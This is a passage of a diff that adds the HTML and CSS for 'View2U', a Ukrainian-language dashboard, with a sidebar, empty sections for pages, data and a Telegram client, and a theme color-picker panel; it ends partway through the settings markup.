@@ -1,0 +1,2564 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>View2U Dashboard</title>
+    <script src="https://js.puter.com/v2/"></script>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400&display=swap" rel="stylesheet">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        :root {
+            /* --- ОСНОВНА ПАЛІТРА --- */
+            --background-color: #f8f9fa;
+            --content-background-color: #ffffff;
+            --primary-color: #4f46e5;
+            --primary-color-hover: #4338ca;
+            --text-color-primary: #1f2937;
+            --text-color-secondary: #6b7280;
+            --border-color: #e5e7eb; /* Default border color */
+            
+            /* --- РОЗШИРЕНА ПАЛІТРА V3 --- */
+            /* Modals & Loaders */
+            --modal-background-color: #ffffff;
+            --modal-text-color: #1f2937;
+            --loader-text-color: #6b7280;
+            /* Headers & Text */
+            --header-text-color: #1f2937;
+            --selection-background-color: #a5b4fc;
+             /* Inputs & Focus */
+            --input-background-color: #f9fafb;
+            --input-border-color: #e5e7eb;
+            --input-focus-border-color: #4f46e5;
+            /* Buttons & Icons */
+            --input-button-background-color: #f3f4f6;
+            --button-text-color: #ffffff;
+            --button-danger-color: #ef4444;
+            --button-danger-hover-color: #dc2626;
+            --button-secondary-hover-color: #e5e7eb;
+            --section-icon-background-color: #eef2ff;
+            /* Borders & Separators */
+            --card-border-color: #e5e7eb;
+            --sidebar-separator-color: #e5e7eb;
+            --sidebar-link-hover-color: #f3f4f6;
+            /* Statuses */
+            --status-published-bg-color: #dcfce7;
+            --status-published-text-color: #166534;
+            --status-pending-bg-color: #e0f2fe;
+            --status-pending-text-color: #0c5998;
+            --status-unpublished-bg-color: #feefc7;
+            --status-unpublished-text-color: #92400e;
+
+            /* --- Розміри для макету --- */
+            --sidebar-width: 260px;
+            --header-height: 70px;
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: var(--background-color);
+            color: var(--text-color-primary);
+        }
+        
+        /* Стиль для блокування прокрутки */
+        body.modal-open {
+            overflow: hidden;
+        }
+
+        /* Стиль для виділення тексту */
+        ::selection {
+            background-color: var(--selection-background-color);
+            color: var(--text-color-primary);
+        }
+        
+        /* FIX: Dashboard Layout */
+        .dashboard-layout {
+            display: flex;
+            min-height: 100vh;
+        }
+
+        #sidebar {
+            width: var(--sidebar-width);
+            background-color: var(--content-background-color);
+            border-right: 1px solid var(--sidebar-separator-color);
+            padding: 24px;
+            position: fixed;
+            top: 0;
+            left: 0;
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+            transform: translateX(0);
+            transition: transform 300ms ease-in-out;
+            z-index: 2000;
+        }
+
+        /* FIX: Main Content Layout */
+        .main-content {
+            flex-grow: 1; /* Allow content to take remaining space */
+            padding-top: 60px;
+            padding-bottom: 40px;
+            padding-right: 40px;
+            padding-left: calc(var(--sidebar-width) + 40px); /* Pushes content away from sidebar */
+            width: 100%;
+        }
+        
+        /* FIX: Main header layout */
+        main > header {
+            margin-bottom: 2rem; /* Tailwind mb-8 */
+        }
+
+        /* --- New Global Loader (Toast) --- */
+        #global-loader {
+            position: fixed;
+            top: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background-color: white;
+            padding: 12px 24px;
+            border-radius: 50px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.1), 0 4px 6px rgba(0,0,0,0.07);
+            display: none;
+            align-items: center;
+            gap: 12px;
+            z-index: 99999; /* Highest z-index to be on top of everything */
+            pointer-events: none;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            animation: slideDownFadeIn 0.3s ease-out;
+        }
+        
+        #global-loader.show {
+            display: flex;
+        }
+        
+        #loader-message {
+            color: var(--loader-text-color);
+        }
+        
+        /* --- FIX: Perfected Modal Loader --- */
+        .modal-loader {
+            position: absolute; 
+            inset: 0; /* Covers the entire modal area */
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 10001; /* Must be higher than modal content */
+            border-radius: 16px; /* Match parent modal's border-radius */
+            overflow: hidden;
+        }
+
+        .modal-loader::before {
+            content: "";
+            position: absolute;
+            inset: 0;
+            background: rgba(255, 255, 255, 0.85); /* Slightly more opaque */
+            backdrop-filter: blur(8px);
+            -webkit-backdrop-filter: blur(8px);
+            z-index: 0;
+        }
+
+        .modal-loader.show {
+            display: flex;
+        }
+
+        .modal-loader-content {
+            position: relative;
+            z-index: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 16px;
+            padding: 24px;
+            background-color: var(--content-background-color);
+            border-radius: 12px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.15);
+            color: var(--loader-text-color);
+        }
+
+        @media (min-width: 465px) {
+            .data-controls { display: block; }
+            .data-controls-spacer { display: none; }
+        }
+
+        @keyframes slideDownFadeIn {
+            from {
+                opacity: 0;
+                transform: translate(-50%, -20px);
+            }
+            to {
+                opacity: 1;
+                transform: translate(-50%, 0);
+            }
+        }
+
+        .loader-spinner {
+            width: 20px;
+            height: 20px;
+            border: 2px solid var(--primary-color);
+            border-top-color: transparent;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            box-sizing: border-box;
+            aspect-ratio: 1 / 1;
+            flex-shrink: 0;
+        }
+
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        /* --- Redesigned Sidebar --- */
+        #sidebar .logo {
+            font-size: 1.5rem;
+            font-weight: 700;
+            color: var(--primary-color);
+            margin-bottom: 40px;
+        }
+
+        #sidebar nav { flex: 1; }
+        #sidebar nav ul { list-style: none; padding: 0; margin: 0; }
+        #sidebar nav ul li a, #sidebar .sidebar-button {
+            display: flex;
+            align-items: center;
+            padding: 12px 16px;
+            border-radius: 8px;
+            font-weight: 500;
+            color: var(--text-color-secondary);
+            text-decoration: none;
+            margin-bottom: 8px;
+            transition: all 0.2s ease-in-out;
+            cursor: pointer;
+        }
+        #sidebar nav ul li a:hover, #sidebar .sidebar-button:hover {
+            background-color: var(--sidebar-link-hover-color);
+            color: var(--text-color-primary);
+        }
+        #sidebar nav ul li a.active {
+            background-color: var(--primary-color);
+            color: white;
+            box-shadow: 0 4px 12px rgba(79, 70, 229, 0.2);
+        }
+        #sidebar nav ul li a svg {
+            margin-right: 12px;
+            width: 20px;
+            height: 20px;
+        }
+        #sidebar .sidebar-bottom { margin-top: auto; }
+        #sidebar .sidebar-button { width: 100%; border: none; background: none; cursor: pointer; }
+
+        /* --- Redesigned Main Content --- */
+        .content-section {
+            background: var(--content-background-color);
+            border-radius: 16px;
+            padding: 32px;
+            margin-bottom: 40px;
+            margin-top: 20px;
+            border: 1px solid var(--card-border-color);
+            opacity: 0;
+            transform: translateY(20px);
+            animation: fadeInUp 0.5s ease-out forwards;
+        }
+        .content-section:nth-child(1) { animation-delay: 0.1s; }
+        .content-section:nth-child(2) { animation-delay: 0.2s; }
+        .content-section:nth-child(3) { animation-delay: 0.3s; }
+        
+        @keyframes fadeInUp {
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        
+        #main-header-title {
+            color: var(--header-text-color);
+        }
+        
+        .section-header {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            margin-bottom: 24px;
+        }
+        .section-icon {
+            width: 48px;
+            height: 48px;
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background-color: var(--section-icon-background-color);
+            color: var(--primary-color);
+        }
+        .section-title h2 {
+            font-size: 1.25rem;
+            font-weight: 600;
+            color: var(--header-text-color);
+        }
+        .section-title p {
+            font-size: 0.875rem;
+            color: var(--text-color-secondary);
+        }
+
+        /* --- Mobile Styles --- */
+        #mobile-header {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: var(--header-height);
+            background-color: var(--content-background-color);
+            backdrop-filter: blur(8px);
+            align-items: center;
+            justify-content: space-between;
+            padding: 0 16px;
+            z-index: 1000;
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        #burger-menu {
+            padding: 8px;
+            background: none;
+            border: none;
+            cursor: pointer;
+        }
+        .burger-line {
+            width: 24px;
+            height: 2px;
+            background-color: var(--text-color-primary);
+            display: block;
+            margin: 5px 0;
+            transition: all 300ms ease-in-out;
+        }
+        #burger-menu.open .burger-line:nth-child(1) { transform: rotate(45deg) translate(5px, 5px); }
+        #burger-menu.open .burger-line:nth-child(2) { opacity: 0; }
+        #burger-menu.open .burger-line:nth-child(3) { transform: rotate(-45deg) translate(5px, -5px); }
+
+        #sidebar-overlay {
+            position: fixed;
+            inset: 0;
+            background-color: rgba(0, 0, 0, 0.5);
+            z-index: 1999;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 300ms ease-in-out;
+        }
+        #sidebar-overlay.visible {
+            opacity: 1;
+            pointer-events: auto;
+        }
+        
+        /* General Component Redesign */
+        .btn {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            padding: 12px 24px;
+            border-radius: 8px;
+            font-weight: 600;
+            border: none;
+            cursor: pointer;
+            transition: all 0.2s ease-in-out;
+            text-decoration: none;
+        }
+        .btn-primary {
+            background-color: var(--primary-color);
+            color: var(--button-text-color);
+        }
+        .btn-primary:hover {
+            background-color: var(--primary-color-hover);
+            transform: translateY(-2px);
+            box-shadow: 0 7px 14px rgba(79, 70, 229, 0.2);
+        }
+        .btn-secondary {
+            background-color: var(--input-button-background-color);
+            color: var(--text-color-primary);
+        }
+        .btn-secondary:hover {
+            background-color: var(--button-secondary-hover-color);
+        }
+        .btn-danger {
+            background-color: var(--button-danger-color);
+            color: var(--button-text-color);
+        }
+        .btn-danger:hover {
+            background-color: var(--button-danger-hover-color);
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 12px 16px;
+            border: 1px solid var(--input-border-color);
+            border-radius: 8px;
+            background-color: var(--input-background-color);
+            transition: border-color 0.2s, box-shadow 0.2s;
+        }
+        .input-field:focus {
+            outline: none;
+            border-color: var(--input-focus-border-color);
+            box-shadow: 0 0 0 3px rgba(79, 70, 229, 0.1);
+        }
+        .input-group { display: flex; }
+        .input-group .input-field { border-top-right-radius: 0; border-bottom-right-radius: 0; }
+        .input-group .btn { border-top-left-radius: 0; border-bottom-left-radius: 0; }
+        
+        .status-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 0.875rem;
+            font-weight: 500;
+        }
+        .status-badge.published { 
+            background-color: var(--status-published-bg-color); 
+            color: var(--status-published-text-color); 
+        }
+        .status-badge.unpublished { 
+            background-color: var(--status-unpublished-bg-color);
+            color: var(--status-unpublished-text-color);
+        }
+        .status-badge.pending { 
+            background-color: var(--status-pending-bg-color);
+            color: var(--status-pending-text-color);
+        }
+        .status-badge .dot { width: 8px; height: 8px; border-radius: 50%; }
+        .status-badge.published .dot { background-color: #22c55e; }
+        .status-badge.unpublished .dot { background-color: #f59e0b; }
+        .status-badge.pending .dot { background-color: #3b82f6; }
+
+        /* Modal Redesign */
+        .modal {
+            background-color: var(--modal-background-color);
+            color: var(--modal-text-color);
+            border-radius: 16px;
+            box-shadow: 0 20px 25px -5px rgba(0,0,0,0.1), 0 10px 10px -5px rgba(0,0,0,0.04);
+            border: none;
+            padding: 0;
+            animation: fadeIn 200ms ease-in-out;
+            position: relative;
+        }
+        .modal::backdrop {
+            background-color: rgba(17, 24, 39, 0.6);
+        }
+        .modal-header, .modal-body, .modal-footer {
+            background-color: transparent; /* Let parent modal color show through */
+        }
+        
+        /* FIX: Ensure page editor modal content inherits background */
+        #page-editor-modal .modal-body .grid > div {
+            background-color: transparent;
+        }
+        
+        .modal-header {
+            padding: 24px 32px;
+            border-bottom: 1px solid var(--border-color);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .modal-title {
+            font-size: 1.25rem;
+            font-weight: 600;
+        }
+        .modal-close-btn {
+            background: var(--input-button-background-color);
+            border: none;
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            cursor: pointer;
+            color: var(--text-color-secondary);
+            font-size: 1.5rem;
+            line-height: 1;
+            transition: all 0.2s;
+        }
+        .modal-close-btn:hover {
+            background: var(--button-secondary-hover-color);
+            color: var(--text-color-primary);
+        }
+        .modal-body { padding: 32px; }
+        .modal-footer {
+            padding: 24px 32px;
+            border-top: 1px solid var(--border-color);
+            display: flex;
+            justify-content: flex-end;
+            gap: 12px;
+            background-color: var(--background-color);
+            border-bottom-left-radius: 16px;
+            border-bottom-right-radius: 16px;
+        }
+        
+        #editor { font-family: 'JetBrains Mono', monospace; }
+        
+        .clickable-data-entry { cursor: pointer; transition: background-color 0.2s; }
+        .clickable-data-entry:hover { background-color: var(--button-secondary-hover-color); }
+        #data-viewer-content img, #data-viewer-content video { max-width: 100%; border-radius: 8px; margin-top: 10px; border: 1px solid #ddd; }
+        #data-viewer-content .data-grid { display: grid; grid-template-columns: auto 1fr; gap: 4px 12px; }
+        
+        #initial-loader {
+            position: fixed;
+            inset: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            background-color: var(--background-color);
+            z-index: 9999;
+        }
+        
+        #initial-loader p {
+            color: var(--loader-text-color);
+        }
+        
+        .initial-spinner {
+            width: 48px;
+            height: 48px;
+            border: 5px solid rgba(79, 70, 229, 0.2);
+            border-top-color: var(--primary-color);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        /* FIX: Responsive Layout Adjustments */
+        @media (max-width: 1024px) {
+            #sidebar {
+                transform: translateX(-100%);
+                box-shadow: 10px 0 25px rgba(0,0,0,0.1);
+            }
+            #sidebar.open {
+                transform: translateX(0);
+            }
+            .main-content {
+                padding-left: 24px; /* Reset padding for mobile */
+                padding-right: 24px;
+                padding-top: calc(var(--header-height) + 24px);
+            }
+            #mobile-header {
+                display: flex;
+            }
+        }
+        @media (max-width: 768px) {
+            .main-content { padding-left: 16px; padding-right: 16px; }
+            .content-section { padding: 24px; }
+            .modal { max-width: calc(100vw - 32px) !important; }
+            
+            #page-section .flex.justify-between.flex-wrap {
+                flex-direction: column;
+                align-items: flex-start;
+                gap: 16px;
+            }
+            #page-section .flex.justify-between.flex-wrap .flex.gap-2 {
+                width: 100%;
+                justify-content: flex-start;
+            }
+
+            #data-viewer-modal .modal-body {
+                max-height: 75vh;
+                overflow-y: auto;
+            }
+            
+            #clients-data-container {
+                background-color: var(--modal-background-color) !important;
+            }
+        }
+        
+        /* Ultra-small devices (e.g., 320-360px width) */
+        @media (max-width: 360px) {
+            .main-content { padding-left: 12px; padding-right: 12px; }
+            .main-content > header h1 { font-size: 1.5rem; }
+            .main-content > header p { font-size: 0.875rem; }
+            .content-section { padding: 16px; }
+            
+            .btn { padding: 8px 12px; font-size: 0.875rem; }
+            .modal .btn { padding: 8px 12px; font-size: 0.875rem; }
+            
+            #sidebar .logo { font-size: 1.25rem; }
+            #sidebar nav ul li a { padding: 10px 12px; }
+            #sidebar nav ul li a svg { width: 18px; height: 18px; margin-right: 10px; }
+            
+            .section-icon { width: 40px; height: 40px; }
+            .section-title h2 { font-size: 1.125rem; }
+            .section-title p { font-size: 0.8125rem; }
+            
+            .input-field { padding: 10px 12px; }
+            .input-group { flex-direction: column; }
+            .input-group .input-field { border-top-right-radius: 8px; border-bottom-right-radius: 8px; }
+            .input-group .btn { border-top-left-radius: 8px; border-bottom-left-radius: 8px; margin-top: 8px; }
+            
+            #mobile-header { padding: 0 12px; }
+            #burger-menu .burger-line { width: 20px; }
+            
+            .modal-header { padding: 16px 20px; }
+            .modal-body { padding: 20px; }
+            .modal-footer { padding: 16px 20px; }
+
+            .modal-loader-content {
+                width: calc(100vw - 24px);
+                max-width: 360px;
+                padding: 20px;
+                text-align: center;
+            }
+            .modal-loader-content span { font-size: 0.875rem; }
+            .modal-loader .loader-spinner { width: 28px; height: 28px; border-width: 3px; }
+
+            #data-viewer-modal .modal-header { padding: 12px 16px; }
+            #data-viewer-modal .modal-body { padding: 16px; }
+            #data-viewer-modal .modal-title { font-size: 1.125rem; }
+            #data-viewer-content .data-grid { grid-template-columns: 1fr; gap: 8px; }
+            #data-viewer-content .data-grid strong { background-color: #f3f4f6; padding: 4px 8px; border-radius: 4px; word-break: break-word; }
+            
+            .color-picker-group input[type="color"] { width: 32px; height: 32px; min-width: 32px; }
+        }
+        
+        /* --- START: TELEGRAM UI IMPROVEMENTS --- */
+        #telegram-client-modal::backdrop { background-color: rgba(0, 0, 0, 0.7); backdrop-filter: blur(5px); }
+        .message-bubble { transition: none; border: 1px solid #e5e7eb; border-radius: 8px; }
+        .message-bubble.bg-blue-100 { background: #3b82f6; color: white; border-color: #3b82f6; }
+        .message-bubble.bg-white { background: #ffffff; color: #333; }
+
+        #telegram-client-modal .flex-col.h-screen { height: 100vh; height: calc(var(--vh, 1vh) * 100); }
+        
+        #telegram-client-modal > div > header { position: sticky; top: 0; z-index: 10; }
+        #tg-chat-view { height: 100%; }
+        #tg-message-input-container, #tg-selection-bar { position: sticky; bottom: 0; z-index: 10; }
+        /* --- END: TELEGRAM UI IMPROVEMENTS --- */
+        
+        @media (max-width: 768px) {
+            #telegram-client-modal #tg-chat-view { display: none; }
+            #telegram-client-modal.chat-active #tg-dialogs-list { display: none; }
+            #telegram-client-modal.chat-active #tg-chat-view { display: flex; width: 100%; }
+            #telegram-client-modal header { padding: 6px 8px; }
+            #telegram-client-modal #tg-chat-header h3 { font-size: 1rem; }
+            #telegram-client-modal #tg-message-input-container { padding: 8px; }
+        }
+        
+        .notification-container{position:fixed;top:20px;right:20px;z-index:10000;display:flex;flex-direction:column;gap:10px;max-width:400px}.notification{background:#fff;border-radius:12px;box-shadow:0 8px 32px rgba(0,0,0,.12);padding:16px 20px;display:flex;align-items:center;gap:12px;transform:translateX(100%);opacity:0;transition:all .3s cubic-bezier(.4,0,.2,1);border-left:4px solid #007bff;position:relative;overflow:hidden}.notification.show{transform:translateX(0);opacity:1}.notification.success{border-left-color:#28a745}.notification.error{border-left-color:#dc3545}.notification.warning{border-left-color:#ffc107}.notification.info{border-left-color:#17a2b8}.notification-icon{width:24px;height:24px;flex-shrink:0}.notification-content{flex:1;min-width:0}.notification-title{font-weight:600;font-size:14px;color:#333;margin:0 0 4px}.notification-message{font-size:13px;color:#666;margin:0;line-height:1.4}.notification-close{background:0 0;border:none;color:#999;cursor:pointer;padding:4px;border-radius:4px;transition:color .2s;flex-shrink:0}.notification-close:hover{color:#666}.notification-progress{position:absolute;bottom:0;left:0;height:3px;background:linear-gradient(90deg,#007bff,#0056b3);transition:width .1s linear}.notification.success .notification-progress{background:linear-gradient(90deg,#28a745,#1e7e34)}.notification.error .notification-progress{background:linear-gradient(90deg,#dc3545,#c82333)}.notification.warning .notification-progress{background:linear-gradient(90deg,#ffc107,#e0a800)}.notification.info .notification-progress{background:linear-gradient(90deg,#17a2b8,#138496)}
+        .context-menu{position:fixed;background:#fff;border-radius:8px;box-shadow:0 8px 32px rgba(0,0,0,.15);padding:8px 0;z-index:10001;min-width:160px;opacity:0;transform:scale(.95);transition:all .15s cubic-bezier(.4,0,.2,1);pointer-events:none}.context-menu.show{opacity:1;transform:scale(1);pointer-events:auto}.context-menu-item{display:flex;align-items:center;gap:12px;padding:10px 16px;cursor:pointer;transition:background-color .15s;font-size:14px;color:#333;border:none;background:0 0;width:100%;text-align:left}.context-menu-item:hover{background-color:#f5f5f5}.context-menu-item.danger{color:#dc3545}.context-menu-item.danger:hover{background-color:#fef2f2}.context-menu-icon{width:16px;height:16px;flex-shrink:0}.context-menu-separator{height:1px;background-color:#e5e5e5;margin:4px 0}
+        @media (max-width:768px){.notification-container{top:10px;right:10px;left:10px;max-width:none}.context-menu{min-width:140px}}
+
+        #junimo-container {position: fixed;top: 0;left: 0;width: 100vw;height: 100vh;z-index: 99999;pointer-events: none;overflow: hidden;}
+        .junimo {position: absolute;pointer-events: auto;cursor: pointer;will-change: transform;transition: transform 0.2s cubic-bezier(0.34, 1.56, 0.64, 1);}
+        .junimo:hover {transform: scale(1.2);}
+        .junimo.clicked {animation: junimo-pop 0.4s ease-out;}
+        @keyframes junimo-pop {0% { transform: scale(1); } 50% { transform: scale(1.5) rotate(15deg); } 100% { transform: scale(1); }}
+        
+        .color-picker-group {display: flex;align-items: center;justify-content: space-between;gap: 16px;padding: 8px 0;}
+        .color-picker-group label {font-weight: 500;color: var(--text-color-primary);}
+        .color-picker-group input[type="color"] {-webkit-appearance: none;-moz-appearance: none;appearance: none;width: 40px;height: 40px;background-color: transparent;border: none;cursor: pointer;padding: 0;border-radius: 50%;overflow: hidden;aspect-ratio: 1 / 1;}
+        .color-picker-group input[type="color"]::-webkit-color-swatch {border-radius: 50%;border: 2px solid var(--border-color);}
+        .color-picker-group input[type="color"]::-moz-color-swatch {border-radius: 50%;border: 2px solid var(--border-color);}
+        
+        #about-modal .about-card {background-color: var(--background-color);border: 1px solid var(--card-border-color);border-radius: 12px;padding: 16px;margin-top: 20px;}
+        #about-modal .about-card h3 {font-size: 1.1rem;font-weight: 600;margin-bottom: 12px;color: var(--header-text-color);}
+        
+        #clients-data-container {background-color: var(--background-color);padding: 24px;}
+        #clients-data-container .data-group {background-color: var(--content-background-color);border: 1px solid var(--card-border-color);padding: 16px;border-radius: 12px;}
+        
+        #editor-controls {display: flex;gap: 8px;margin-bottom: 12px;}
+        #editor-controls button {background: var(--input-button-background-color);border: 1px solid var(--border-color);border-radius: 6px;padding: 6px 10px;cursor: pointer;transition: background-color 0.2s;}
+        #editor-controls button:hover:not(:disabled) {background-color: var(--button-secondary-hover-color);}
+        #editor-controls button:disabled {opacity: 0.5;cursor: not-allowed;}
+
+    </style>
+</head>
+<body class="min-h-screen">
+    
+    <div id="global-loader">
+        <div class="loader-spinner"></div>
+        <span id="loader-message" class="font-medium">Обробка...</span>
+    </div>
+
+    <div class="dashboard-layout">
+        <aside id="sidebar">
+            <div class="logo">View2U</div>
+            <nav>
+                <ul>
+                    <li><a href="#dashboard" class="active" data-section="dashboard-content">
+                        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6"><path stroke-linecap="round" stroke-linejoin="round" d="M3.75 6A2.25 2.25 0 016 3.75h2.25A2.25 2.25 0 0110.5 6v2.25a2.25 2.25 0 01-2.25 2.25H6a2.25 2.25 0 01-2.25-2.25V6zM3.75 15.75A2.25 2.25 0 016 13.5h2.25a2.25 2.25 0 012.25 2.25V18a2.25 2.25 0 01-2.25 2.25H6A2.25 2.25 0 013.75 18v-2.25zM13.5 6a2.25 2.25 0 012.25-2.25H18A2.25 2.25 0 0120.25 6v2.25A2.25 2.25 0 0118 10.5h-2.25a2.25 2.25 0 01-2.25-2.25V6zM13.5 15.75a2.25 2.25 0 012.25-2.25H18a2.25 2.25 0 012.25 2.25V18A2.25 2.25 0 0118 20.25h-2.25A2.25 2.25 0 0113.5 18v-2.25z" /></svg>
+                        Панель керування
+                    </a></li>
+                    <li><a href="#settings" data-section="settings-content">
+                        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6"><path stroke-linecap="round" stroke-linejoin="round" d="M9.594 3.94c.09-.542.56-.94 1.11-.94h2.593c.55 0 1.02.398 1.11.94l.213 1.281c.063.374.313.686.645.87.074.04.147.083.22.127.324.196.72.257 1.075.124l1.217-.456a1.125 1.125 0 011.37.49l1.296 2.247a1.125 1.125 0 01-.26 1.431l-1.003.827c-.293.24-.438.613-.438.995s.145.755.438.995l1.003.827c.48.398.668 1.03.26 1.431l-1.296 2.247a1.125 1.125 0 01-1.37.49l-1.217-.456c-.355-.133-.75-.072-1.076.124a6.57 6.57 0 01-.22.128c-.333.183-.582.495-.645.87l-.213 1.28c-.09.543-.56.941-1.11.941h-2.594c-.55 0-1.02-.398-1.11-.94l-.213-1.281c-.063-.374-.313-.686-.645-.87a6.52 6.52 0 01-.22-.127c-.325-.196-.72-.257-1.076-.124l-1.217.456a1.125 1.125 0 01-1.37-.49l-1.296-2.247a1.125 1.125 0 01.26-1.431l1.004-.827c.292-.24.437-.613.437-.995s-.145-.755-.437-.995l-1.004-.827a1.125 1.125 0 01-.26-1.431l1.296-2.247a1.125 1.125 0 011.37-.49l1.217.456c.355.133.75.072 1.076-.124.072-.044.146-.087.22-.128.332-.183.582-.495.645-.87l.213-1.28z" /><path stroke-linecap="round" stroke-linejoin="round" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" /></svg>
+                        Налаштування
+                    </a></li>
+                </ul>
+            </nav>
+            <div class="sidebar-bottom">
+                 <button id="profile-btn" class="sidebar-button">
+                    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6 mr-3"><path stroke-linecap="round" stroke-linejoin="round" d="M15.75 6a3.75 3.75 0 11-7.5 0 3.75 3.75 0 017.5 0zM4.501 20.118a7.5 7.5 0 0114.998 0A17.933 17.933 0 0112 21.75c-2.676 0-5.216-.584-7.499-1.632z" /></svg>
+                    Профіль
+                </button>
+                 <button id="about-btn" class="sidebar-button">
+                    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6 mr-3"><path stroke-linecap="round" stroke-linejoin="round" d="M11.25 11.25l.041-.02a.75.75 0 011.063.852l-.708 2.836a.75.75 0 001.063.853l.041-.021M21 12a9 9 0 11-18 0 9 9 0 0118 0zm-9-3.75h.008v.008H12V8.25z" /></svg>
+                    Про проект
+                </button>
+                <button onclick="logout()" class="sidebar-button">
+                    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6 mr-3"><path stroke-linecap="round" stroke-linejoin="round" d="M15.75 9V5.25A2.25 2.25 0 0013.5 3h-6a2.25 2.25 0 00-2.25 2.25v13.5A2.25 2.25 0 007.5 21h6a2.25 2.25 0 002.25-2.25V15M12 9l-3 3m0 0l3 3m-3-3h12.75" /></svg>
+                    Вийти
+                </button>
+            </div>
+        </aside>
+        <div id="sidebar-overlay"></div>
+
+        <header id="mobile-header">
+             <div class="logo">View2U</div>
+             <button id="burger-menu">
+                <span class="burger-line"></span>
+                <span class="burger-line"></span>
+                <span class="burger-line"></span>
+            </button>
+        </header>
+
+        <main class="main-content">
+            <header>
+                <h1 id="main-header-title" class="text-3xl font-bold">Панель керування</h1>
+                <p id="main-header-subtitle" class="text-gray-500 mt-1">Керуйте вашими сторінками та даними</p>
+            </header>
+
+            <div id="dashboard-content">
+                <section id="page-section" class="content-section"></section>
+                <section id="data-section" class="content-section"></section>
+                <section id="telegram-section" class="content-section"></section>
+            </div>
+            
+            <div id="settings-content" style="display: none;">
+                <section class="content-section">
+                    <div class="section-header">
+                        <div class="section-icon"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6"><path stroke-linecap="round" stroke-linejoin="round" d="M4.098 19.902a3.75 3.75 0 005.304 0l6.401-6.402M6.75 21A3.75 3.75 0 013 17.25V4.125C3 3.504 3.504 3 4.125 3h5.25c.621 0 1.125.504 1.125 1.125v4.072M6.75 21a3.75 3.75 0 003.75-3.75V8.197M6.75 21h13.125c.621 0 1.125-.504 1.125-1.125v-5.25c0-.621-.504-1.125-1.125-1.125h-4.072M10.5 8.197l2.88-2.88c.152-.152.322-.28.509-.386a3.75 3.75 0 015.304 5.304c-.106.187-.234.357-.386.51l-2.88 2.88" /></svg></div>
+                        <div class="section-title"><h2>Тема інтерфейсу</h2><p>Налаштуйте вигляд панелі керування</p></div>
+                    </div>
+                    <div id="theme-settings-container" class="space-y-2 divide-y divide-gray-200">
+                        <!-- Main Palette -->
+                        <div class="color-picker-group"><label>Фон сторінки</label><input type="color" data-css-var="--background-color"></div>
+                        <div class="color-picker-group"><label>Фон блоків</label><input type="color" data-css-var="--content-background-color"></div>
+                        <div class="color-picker-group"><label>Фон модальних вікон</label><input type="color" data-css-var="--modal-background-color"></div>
+                        <div class="color-picker-group"><label>Основний колір (акценти)</label><input type="color" data-css-var="--primary-color"></div>
+                        <div class="color-picker-group"><label>Основний колір (наведення)</label><input type="color" data-css-var="--primary-color-hover"></div>
+                        <!-- Text & Headers -->
+                        <div class="color-picker-group"><label>Основний текст</label><input type="color" data-css-var="--text-color-primary"></div>
+                        <div class="color-picker-group"><label>Другорядний текст</label><input type="color" data-css-var="--text-color-secondary"></div>
+                        <div class="color-picker-group"><label>Текст у модальних вікнах</label><input type="color" data-css-var="--modal-text-color"></div>
+                        <div class="color-picker-group"><label>Заголовки (H1, H2)</label><input type="color" data-css-var="--header-text-color"></div>
+                        <div class="color-picker-group"><label>Текст завантаження</label><input type="color" data-css-var="--loader-text-color"></div>
+                        <div class="color-picker-group"><label>Колір виділення тексту</label><input type="color" data-css-var="--selection-background-color"></div>
+                        <!-- Inputs & Borders -->
+                        <div class="color-picker-group"><label>Фон полів вводу</label><input type="color" data-css-var="--input-background-color"></div>
+                        <div class="color-picker-group"><label>Обводка полів вводу</label><input type="color" data-css-var="--input-border-color"></div>
+                        <div class="color-picker-group"><label>Обводка полів (у фокусі)</label><input type="color" data-css-var="--input-focus-border-color"></div>
+                        <!-- Buttons & Icons -->
+                        <div class="color-picker-group"><label>Текст на кнопках</label><input type="color" data-css-var="--button-text-color"></div>
